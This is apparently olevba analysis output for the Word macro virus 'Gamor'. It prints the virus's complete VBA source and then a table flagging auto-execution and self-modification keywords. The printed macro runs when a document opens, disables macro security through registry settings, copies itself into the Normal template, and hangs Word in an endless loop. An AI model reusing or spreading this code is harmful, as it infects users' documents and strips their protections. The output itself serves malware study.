olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Gamor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Gamor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Gameover
Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", " Level ") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
GameOver = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 30)
Set Nec = NormalTemplate.VBProject.VBComponents(1).CodeModule
If ThisDocument = NormalTemplate Then _
 Set Nec = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Nec
 If .Lines(1, 1) <> "'Gameover" Then
     .DeleteLines 1, .CountOfLines
     .InsertLines 1, GameOver
     If ThisDocument = NormalTemplate Then _
      ActiveDocument.SaveAs ActiveDocument.FullName
 End If
End With
MsgBox "Its over!" & vbCr & "Its not possible to love somebody who doesn't loves you!" & vbCr & "Nicole,see ya maybe in my next life!?" & vbCr & "I got a new one!Greets to DoctorOwl." & vbCr & "Necronomikon[ZeroGravity]", 64, "*GameOver*"
'thanks Yello for this piece of Code!
Do
CommandBars("Menu Bar").Controls(10).Copy
Loop
End Sub
'GameOver
'Greets to all i know especially Doctor Owl(She was a bitch you're right)!
'(c)07/18/2001 by Necronomikon[ZeroGravity]


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

